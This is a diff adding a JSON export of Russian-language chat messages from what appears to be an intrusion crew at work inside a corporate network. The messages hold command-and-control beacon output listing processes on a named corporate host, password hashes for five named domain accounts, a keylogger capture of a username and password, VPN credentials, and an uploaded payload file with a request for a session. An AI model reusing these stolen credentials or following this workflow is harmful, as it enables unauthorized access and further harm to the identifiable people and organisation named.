@@ -1,0 +1,250 @@
+{
+  "messages": [
+    {
+      "_id": "iDmikZnqHJhQRrppC",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "файлик забрало",
+      "ts": "2021-01-28T20:51:05.924Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-01-28T20:51:05.976Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FqvhkSTPBkuTA9Mai",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "чёт не летит (",
+      "ts": "2021-01-28T20:50:32.903Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-01-28T20:50:32.953Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3z6LMfekkutYyZE3J",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "сек",
+      "ts": "2021-01-28T20:21:19.200Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-01-28T20:21:19.244Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cJfJQGhK6SFN37cBC",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "ctr",
+      "ts": "2021-01-28T20:21:17.811Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-01-28T20:21:17.854Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hqwuSeoDKQFfmiTbZ",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "@tl1",
+      "ts": "2021-01-28T19:56:13.856Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-01-28T19:56:13.898Z",
+      "mentions": [
+        {
+          "_id": "yJcaRFnKQqepiffHq",
+          "username": "tl1",
+          "name": "Team Lead 1"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "86zgm248Ge69CDcMc",
+      "rid": "48Aw6FwTqss9QRLft",
+      "ts": "2021-01-28T19:56:02.507Z",
+      "msg": "",
+      "file": {
+        "_id": "xqy2qp8M9YRyWqw2J",
+        "name": "pl.bin",
+        "type": "application/octet-stream"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "pl.bin",
+          "title_link": "/file-upload/xqy2qp8M9YRyWqw2J/pl.bin",
+          "title_link_download": true,
+          "type": "file",
+          "description": "@tl1  пульни сессию пожайлуста"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-01-28T19:58:46.625Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2021-01-28T19:58:46.621Z",
+      "editedBy": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7"
+      },
+      "urls": []
+    },
+    {
+      "_id": "hvb62nvveizNcipNJ",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "```\nCORP\\jvelazquezg 956e44f5069e8f0161ea7064840894ff\nCORP\\Rflores 3e33c0155d517e77ad1a4040c9ed4e45\nCORP\\lvegar 06ca20732bea98870c93d29a2b31e783\nFILIAL\\Anavarretea 5cb20c880326791e424fc9f2554ae9b4\nCORP\\evazquezpr 288c03a4543cf46d0a665df89f1b8a3d\n``` \nкое как снал хэши",
+      "ts": "2021-01-28T18:38:47.529Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-01-28T18:38:47.634Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WnRrRZdNhuBA3s4wx",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "```\nTeemo[SFE18491]Hgutierreze/792560|2021Jan28 20:51:16> shell tasklist /v /s CORPKIOVDAPGM01.corp.televisa.com.mx\n[*] Tasked beacon to run: tasklist /v /s CORPKIOVDAPGM01.corp.televisa.com.mx\n[+] host called home, sent: 82 bytes\nNombre de imagen               PID Nombre de sesión Núm. de ses Uso de memor Nombre de usuario                                  Tiempo de CP\n========================= ======== ================ =========== ============ ================================================== ============\nSystem Idle Process              0 Services                   0         4 KB NT AUTHORITY\\SYSTEM                                  1600:47:50\nSystem                           4 Services                   0       256 KB N/D                                                     3:39:06\nsmss.exe                      1340 Services                   0     1,052 KB NT AUTHORITY\\SYSTEM                                     0:00:01\ncsrss.exe                     1452 Services                   0     4,724 KB NT AUTHORITY\\SYSTEM                                     0:00:42\nwininit.exe                   1524 Services                   0     4,152 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nservices.exe                  1616 Services                   0    14,012 KB NT AUTHORITY\\SYSTEM                                     0:02:46\nlsass.exe                     1660 Services                   0    60,944 KB NT AUTHORITY\\SYSTEM                                     0:27:11\nsvchost.exe                   1752 Services                   0    22,616 KB NT AUTHORITY\\SYSTEM                                     0:06:03\nsvchost.exe                   1784 Services                   0    14,632 KB NT AUTHORITY\\NETWORK SERVICE                            0:03:50\nsvchost.exe                   1900 Services                   0    25,576 KB NT AUTHORITY\\LOCAL SERVICE                              3:10:52\nsvchost.exe                   1916 Services                   0    91,696 KB NT AUTHORITY\\SYSTEM                                     2:50:25\nsvchost.exe                   1940 Services                   0    18,528 KB NT AUTHORITY\\LOCAL SERVICE                              0:01:21\nCitrix.Wem.Agent.Service.     1996 Services                   0   135,548 KB NT AUTHORITY\\SYSTEM                                     0:12:47\nsvchost.exe                   1412 Services                   0    73,540 KB NT AUTHORITY\\SYSTEM                                     3:24:01\nCitrix.Wem.Agent.LogonSer     1188 Services                   0    26,320 KB NT AUTHORITY\\SYSTEM                                     0:00:02\nsvchost.exe                   1608 Services                   0    23,080 KB NT AUTHORITY\\NETWORK SERVICE                            0:10:18\nCtxPvDSvc.exe                 1180 Services                   0     7,976 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nsvchost.exe                   1404 Services                   0    28,256 KB NT AUTHORITY\\SYSTEM                                     0:00:34\nUserProfileManager.exe        2068 Services                   0    15,532 KB NT AUTHORITY\\SYSTEM                                     0:05:52\nsvchost.exe                   2184 Services                   0     9,100 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:05\nsvchost.exe                   2236 Services                   0    16,064 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:21\nPvsVmAgent.exe                2268 Services                   0     6,068 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nBNDevice.exe                  2388 Services                   0    11,816 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nspoolsv.exe                   2544 Services                   0    77,740 KB NT AUTHORITY\\SYSTEM                                     0:39:24\narmsvc.exe                    2584 Services                   0     6,768 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nBrokerAgent.exe               2712 Services                   0   136,640 KB NT AUTHORITY\\NETWORK SERVICE                            0:15:24\nCdfSvc.exe                    2820 Services                   0     7,636 KB NT AUTHORITY\\NETWORK SERVICE                            0:00:00\nencsvc.exe                    2860 Services                   0     6,972 KB NT AUTHORITY\\LOCAL SERVICE                              0:39:29\nCseEngine.exe                 2948 Services                   0 1,081,368 KB NT AUTHORITY\\SYSTEM                                     4:51:34\nctxrdr.exe                    3004 Services                   0     7,360 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:00\nCtxCeipSvc.exe                2064 Services                   0     8,804 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:00\nCpSvc.exe                     2156 Services                   0    35,064 KB NT AUTHORITY\\LOCAL SERVICE                              0:17:06\nCtxAppVService.exe            2464 Services                   0    45,288 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nCtxSvcHost.exe                2428 Services                   0     9,856 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:04\nCtxSvcHost.exe                2684 Services                   0     8,204 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:00\nWebSocketService.exe           532 Services                   0     9,924 KB NT AUTHORITY\\SYSTEM                                     0:00:01\nCtxSvcHost.exe                1016 Services                   0     8,096 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:01\nCtxSvcHost.exe                 912 Services                   0     7,536 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:00\nCtxSvcHost.exe                 392 Services                   0    12,740 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:42\nmacmnsvc.exe                   988 Services                   0    12,816 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:13\nmasvc.exe                     1128 Services                   0    28,904 KB NT AUTHORITY\\SYSTEM                                     0:03:42\nCtxSvcHost.exe                2764 Services                   0     7,372 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:00\nSCService64.exe               2656 Services                   0    23,728 KB NT AUTHORITY\\NETWORK SERVICE                            0:00:17\nsvchost.exe                   2516 Services                   0    40,968 KB NT AUTHORITY\\NETWORK SERVICE                            0:48:48\nSemsService.exe               2872 Services                   0    39,660 KB NT AUTHORITY\\LOCAL SERVICE                              0:02:54\nImaAdvanceSrv64.exe           3192 Services                   0     8,708 KB NT AUTHORITY\\SYSTEM                                     0:00:18\nmacompatsvc.exe               3968 Services                   0    15,224 KB NT AUTHORITY\\SYSTEM                                     0:00:12\nmfemactl.exe                  3164 Services                   0     8,196 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nsvchost.exe                   2844 Services                   0    11,260 KB NT AUTHORITY\\SYSTEM                                     0:01:11\nsvchost.exe                   4108 Services                   0     7,728 KB NT AUTHORITY\\NETWORK SERVICE                            0:00:02\nTelemetryService.exe          3092 Services                   0    69,936 KB NT SERVICE\\CitrixTelemetryService                       0:00:08\nAotListener.exe               2040 Services                   0    25,312 KB NT SERVICE\\CitrixTelemetryService                       0:00:00\nconhost.exe                   4584 Services                   0     6,008 KB NT SERVICE\\CitrixTelemetryService                       0:00:00\nVSSVC.exe                     3892 Services                   0     9,224 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nmsdtc.exe                     3720 Services                   0     9,652 KB NT AUTHORITY\\NETWORK SERVICE                            0:00:00\nsvchost.exe                   2932 Services                   0     6,780 KB NT AUTHORITY\\LOCAL SERVICE                              0:00:00\nmctelsvc.exe                   428 Services                   0    15,404 KB NT AUTHORITY\\SYSTEM                                     0:00:03\nCloudamizeWatchdog.exe        4036 Services                   0    44,692 KB NT AUTHORITY\\SYSTEM                                     0:01:43\ncsrss.exe                     4132 Console                    2     3,928 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nwinlogon.exe                  2172 Console                    2    10,192 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nLogonUI.exe                   2452 Console                    2    28,604 KB NT AUTHORITY\\SYSTEM                                     0:00:00\ndwm.exe                       3076 Console                    2    27,300 KB Window Manager\\DWM-2                                    0:00:00\nWmiPrvSE.exe                 13236 Services                   0    36,596 KB NT AUTHORITY\\SYSTEM                                     0:58:13\nWmiPrvSE.exe                  1288 Services                   0    24,688 KB NT AUTHORITY\\LOCAL SERVICE                              0:01:42\nWmiPrvSE.exe                 11844 Services                   0    12,904 KB NT AUTHORITY\\NETWORK SERVICE                            0:02:52\ncsrss.exe                    10104 ICA-CGP#13               108    12,360 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nwinlogon.exe                 12108 ICA-CGP#13               108    13,176 KB NT AUTHORITY\\SYSTEM                                     0:00:06\ndwm.exe                      11816 ICA-CGP#13               108    38,720 KB Window Manager\\DWM-108                                  0:00:01\nctxgfx.Exe                    8400 ICA-CGP#13               108    26,860 KB NT AUTHORITY\\SYSTEM                                     0:00:01\ntaskhostex.exe               10436 ICA-CGP#13               108     9,088 KB CORP\\jvelazquezg                                        0:00:00\nicak2meng.exe                12952 ICA-CGP#13               108     7,344 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nwfshell.exe                   9128 ICA-CGP#13               108    21,312 KB CORP\\jvelazquezg                                        0:00:00\nCtxMtHost.exe                 8132 ICA-CGP#13               108     8,584 KB CORP\\jvelazquezg                                        0:00:00\nSptEddss.exe                  4080 ICA-CGP#13               108    38,776 KB CORP\\jvelazquezg                                        0:00:14\nDirectorComServer.exe        12256 ICA-CGP#13               108    21,836 KB CORP\\jvelazquezg                                        0:00:00\ncsrss.exe                    10924 ICA-CGP#14               120     8,728 KB NT AUTHORITY\\SYSTEM                                     0:00:03\nwinlogon.exe                 12836 ICA-CGP#14               120    13,232 KB NT AUTHORITY\\SYSTEM                                     0:00:01\ndwm.exe                       1860 ICA-CGP#14               120    37,976 KB Window Manager\\DWM-120                                  0:00:02\nctxgfx.Exe                    9544 ICA-CGP#14               120    46,704 KB NT AUTHORITY\\SYSTEM                                     0:00:06\nicak2meng.exe                 8960 ICA-CGP#14               120     7,344 KB NT AUTHORITY\\SYSTEM                                     0:00:00\ntaskhostex.exe                2036 ICA-CGP#14               120     9,016 KB CORP\\lvegar                                             0:00:00\nwfshell.exe                  13040 ICA-CGP#14               120    20,920 KB CORP\\lvegar                                             0:00:00\nDirectorComServer.exe        13264 ICA-CGP#14               120    21,900 KB CORP\\lvegar                                             0:00:00\nCtxMtHost.exe                 9096 ICA-CGP#14               120     8,576 KB CORP\\lvegar                                             0:00:00\nPgmCtl32.exe                  1720 ICA-CGP#14               120    71,376 KB CORP\\lvegar                                             0:01:56\nTitleMan.exe                 12948 ICA-CGP#14               120    33,388 KB CORP\\lvegar                                             0:00:01\nWmiPrvSE.exe                 11700 Services                   0    13,344 KB NT AUTHORITY\\NETWORK SERVICE                            0:00:05\ncsrss.exe                      580 ICA-CGP#113               77     8,312 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nwinlogon.exe                  4428 ICA-CGP#113               77    13,208 KB NT AUTHORITY\\SYSTEM                                     0:00:00\ndwm.exe                       3736 ICA-CGP#113               77    29,288 KB Window Manager\\DWM-77                                   0:00:00\nctxgfx.Exe                    9272 ICA-CGP#113               77    26,384 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nicak2meng.exe                12472 ICA-CGP#113               77     7,300 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nwfshell.exe                  12764 ICA-CGP#113               77    21,344 KB FILIAL\\Anavarretea                                      0:00:00\nCtxMtHost.exe                  600 ICA-CGP#113               77     8,580 KB FILIAL\\Anavarretea                                      0:00:00\nAccounts.exe                  3824 ICA-CGP#113               77    32,612 KB FILIAL\\Anavarretea                                      0:00:13\ntaskhostex.exe               12336 ICA-CGP#113               77     8,968 KB FILIAL\\Anavarretea                                      0:00:00\nDirectorComServer.exe         6428 ICA-CGP#113               77    21,860 KB FILIAL\\Anavarretea                                      0:00:00\ncsrss.exe                     9464 ICA-CGP#115               38     8,640 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nwinlogon.exe                  5088 ICA-CGP#115               38    13,196 KB NT AUTHORITY\\SYSTEM                                     0:00:00\ndwm.exe                       9640 ICA-CGP#115               38    29,636 KB Window Manager\\DWM-38                                   0:00:00\nctxgfx.Exe                     456 ICA-CGP#115               38    35,472 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nicak2meng.exe                10760 ICA-CGP#115               38     7,332 KB NT AUTHORITY\\SYSTEM                                     0:00:00\ntaskhostex.exe                9872 ICA-CGP#115               38     8,988 KB CORP\\pbsilvalo                                          0:00:00\nwfshell.exe                   6504 ICA-CGP#115               38    20,820 KB CORP\\pbsilvalo                                          0:00:00\nCtxMtHost.exe                 8168 ICA-CGP#115               38     8,588 KB CORP\\pbsilvalo                                          0:00:00\nPgmCtl32.exe                  8600 ICA-CGP#115               38    66,664 KB CORP\\pbsilvalo                                          0:00:10\nDirectorComServer.exe         4588 ICA-CGP#115               38    21,900 KB CORP\\pbsilvalo                                          0:00:00\nTitleMan.exe                 11740 ICA-CGP#115               38    33,332 KB CORP\\pbsilvalo                                          0:00:01\nSptEddss.exe                  9260 ICA-CGP#13               108    35,328 KB CORP\\jvelazquezg                                        0:00:05\nrundll32.exe                  7884 Services                   0    11,312 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nrundll32.exe                  5968 Services                   0    11,336 KB NT AUTHORITY\\SYSTEM                                     0:00:00\npowershell.exe               10816 Services                   0    91,076 KB NT AUTHORITY\\SYSTEM                                     0:00:01\nconhost.exe                  12992 Services                   0     6,172 KB NT AUTHORITY\\SYSTEM                                     0:00:00\npowershell.exe               10928 Services                   0    52,624 KB NT AUTHORITY\\SYSTEM                                     0:00:00\nconhost.exe                   4548 Services                   0     5,940 KB NT AUTHORITY\\SYSTEM                                     0:00:00\n\n``` \nчто-то не притягивается тачка",
+      "ts": "2021-01-28T18:19:21.868Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-01-28T18:22:32.085Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2021-01-28T18:22:32.080Z",
+      "editedBy": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7"
+      },
+      "urls": []
+    },
+    {
+      "_id": "CxmCWP7nveyHfnGt9",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "@user7 тогда тут работаешь",
+      "ts": "2021-01-28T15:46:23.960Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-01-28T15:46:23.994Z",
+      "mentions": [
+        {
+          "_id": "MtKNTY3DtoTqRm2E3",
+          "username": "user7",
+          "name": "ahyhax"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "tGDGwHASfiaNHQ8Pe",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "```\nUser    : NT AUTHORITY\\SYSTEM\nWindow  : Conexión - Internet Explorer\nTime    : 2021-01-28 09:36:38 a. m.\nLogFile : WireTap.log\n----------------------------------------------\nhgutie<Tab>\n[+] received output:\n73HILArioge=<Enter>\n```",
+      "ts": "2021-01-28T15:39:54.474Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-01-28T15:39:54.606Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6GrDBDbMTSRp7LvBC",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "Как в воду глядел)",
+      "ts": "2021-01-28T15:38:38.810Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2021-01-28T15:38:38.852Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GZTBvcR6gYQxAytKn",
+      "rid": "48Aw6FwTqss9QRLft",
+      "ts": "2021-01-28T15:38:17.906Z",
+      "msg": "",
+      "file": {
+        "_id": "zNSLbPAYNPB6WhKJY",
+        "name": "5c69f199-d67d-4fe0-b1f7-ee7c3b1a9de2.jpg",
+        "type": "image/jpeg"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "5c69f199-d67d-4fe0-b1f7-ee7c3b1a9de2.jpg",
+          "title_link": "/file-upload/zNSLbPAYNPB6WhKJY/5c69f199-d67d-4fe0-b1f7-ee7c3b1a9de2.jpg",
+          "title_link_download": true,
+          "image_dimensions": {
+            "width": 1366,
+            "height": 768
+          },
+          "image_preview": "/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAASACADASIAAhEBAxEB/8QAGwAAAQQDAAAAAAAAAAAAAAAAAAIDBQcBBAb/xAAnEAABBAECAwkAAAAAAAAAAAABAAIDBBEFIQYS0SIxQVFSU4GDkf/EABUBAQEAAAAAAAAAAAAAAAAAAAAB/8QAFhEBAQEAAAAAAAAAAAAAAAAAAAER/9oADAMBAAIRAxEAPwC/qs2LBgEh27gcKYptdIwkeBxunBUg5ubDObzynIImQghkjRk5O6bTITIJmAENBSCbJxhgIK22vGe1I0/Ky53pc39QcTwzLI/Sahe9ziW7knKqziS9bZr91rLU7Wh2wEhACEIlRtvULgrxkW7AOfcd1SquoXSd7dg/a7qhCK//2Q==",
+          "image_url": "/file-upload/zNSLbPAYNPB6WhKJY/5c69f199-d67d-4fe0-b1f7-ee7c3b1a9de2.jpg",
+          "image_type": "image/jpeg",
+          "image_size": 138893,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-01-28T15:38:17.960Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6D4Fv4kaHWKRmFYrt",
+      "rid": "48Aw6FwTqss9QRLft",
+      "msg": "```\nTrGUI\n=======\nR8WTksIOle1rP8)P\n253758\n``` \nвпн",
+      "ts": "2021-01-28T15:35:23.316Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2021-01-28T15:35:23.394Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
